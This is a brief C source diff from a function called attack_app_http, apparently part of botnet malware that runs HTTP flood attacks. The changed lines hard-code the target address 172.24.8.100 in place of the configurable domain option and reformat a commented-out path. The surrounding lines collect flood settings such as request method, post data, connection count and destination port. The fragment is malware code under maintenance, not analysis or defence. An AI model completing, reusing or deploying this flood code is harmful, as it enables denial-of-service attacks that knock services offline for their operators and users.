@@ -29,8 +29,8 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
     struct attack_http_state *http_table = NULL;
     char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
     char *method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "GET");
-    char *domain = "172.24.8.100";//attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
-//char *path ="/w_top.htm";    
+    char *domain = "172.24.8.100";  // attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
+    //char *path ="/w_top.htm";    
 	char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
     int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);
     port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
